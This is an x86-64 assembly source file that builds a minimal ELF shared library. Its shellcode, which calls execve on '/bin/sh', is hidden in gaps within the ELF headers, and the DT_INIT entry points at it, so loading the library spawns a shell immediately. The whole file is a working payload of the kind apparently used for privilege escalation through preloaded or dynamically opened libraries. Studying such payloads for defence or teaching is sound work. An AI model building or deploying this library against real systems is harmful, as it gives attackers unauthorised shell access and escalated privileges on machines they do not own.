/* From elf.h */
#define ELFMAG0         0x7f            /* Magic number byte 0 */
#define ELFMAG1         'E'             /* Magic number byte 1 */
#define ELFMAG2         'L'             /* Magic number byte 2 */
#define ELFMAG3         'F'             /* Magic number byte 3 */
#define ELFCLASS64      2               /* 64-bit objects */
#define ELFDATA2LSB     1               /* 2's complement, little endian */
#define EV_CURRENT      1               /* Current version */
#define ET_DYN          3               /* Shared object file */
#define EM_X86_64       62      /* AMD x86-64 architecture */
#define PT_LOAD         1               /* Loadable program segment */
#define PT_DYNAMIC      2               /* Dynamic linking information */
#define PF_X            (1 << 0)        /* Segment is executable */
#define PF_W            (1 << 1)        /* Segment is writable */
#define PF_R            (1 << 2)        /* Segment is readable */
#define DT_NULL         0               /* Marks end of dynamic section */
#define DT_STRTAB       5               /* Address of string table */
#define DT_SYMTAB       6               /* Address of symbol table */
#define DT_INIT         12              /* Address of init function */

#define Elf64_Addr .quad
#define Elf64_Off .quad
#define Elf64_Half .short
#define Elf64_Word .int
#define Elf64_Sword .int
#define Elf64_Xword .quad
#define Elf64_Sxword .quad

#define FILE_OFFSET(x) ((x) - e_ident)
#define VIRTUAL_ADDRESS(x) ((x) - e_ident)

e_ident: .byte ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3, ELFCLASS64, ELFDATA2LSB, EV_CURRENT, 0, 0, 0, 0, 0, 0, 0, 0, 0
e_type: Elf64_Half ET_DYN
e_machine: Elf64_Half EM_X86_64
e_version: Elf64_Word EV_CURRENT
e_entry: .asciz "/bin/sh"
e_phoff: Elf64_Off FILE_OFFSET(p_type0)
shellcode:               /* gap: 14 bytes */
xor %rdx, %rdx           /* 3 */
lea e_entry(%rip), %rdi  /* 7 */
push %rdx                /* 1 */
push %rdi                /* 1 */
jmp shellcode2           /* 2 */
e_phentsize: Elf64_Half p_end0 - p_type0
e_phnum: Elf64_Half 2
e_shentsize: Elf64_Half 0
e_shnum: Elf64_Half 0
e_shstrndx: Elf64_Half 0
e_end:

p_type0: Elf64_Word PT_LOAD
p_flags0: Elf64_Word PF_R | PF_W | PF_X
p_offset0: Elf64_Off FILE_OFFSET(p0)
p_vaddr0: Elf64_Addr VIRTUAL_ADDRESS(p0)
shellcode2:              /* gap: 8 bytes */
mov %rsp, %rsi           /* 3 */
xor %rax,%rax            /* 3 */
jmp shellcode3           /* 2 */
p_filesz0: Elf64_Xword p0_end - e_ident
p_memsz0: Elf64_Xword p0_end - e_ident
p_align0: Elf64_Xword 4096  /* avoid "ELF load command alignment not page-aligned" */
p_end0:

p_type1: Elf64_Word PT_DYNAMIC
p_flags1: Elf64_Word PF_R | PF_W | PF_X
p_offset1: Elf64_Off FILE_OFFSET(p1)
p_vaddr1: Elf64_Addr VIRTUAL_ADDRESS(p1)
shellcode3:              /* gap: 8 bytes */
mov $59, %al             /* 2 */
syscall                  /* 2 */
.byte 0, 0, 0, 0         /* 4 */
p_filesz1: Elf64_Xword p1_end - p1
p_memsz1: Elf64_Xword p1_end - p1
p_align1: Elf64_Xword 1
p_end1:

p0:
p0_end:

p1:
d_tag0: Elf64_Sxword DT_STRTAB
d_ptr0: Elf64_Addr 0
d_tag1: Elf64_Sxword DT_SYMTAB
d_ptr1: Elf64_Addr 0
d_tag2: Elf64_Sxword DT_INIT
d_ptr2: Elf64_Addr VIRTUAL_ADDRESS(shellcode)
p1_end:
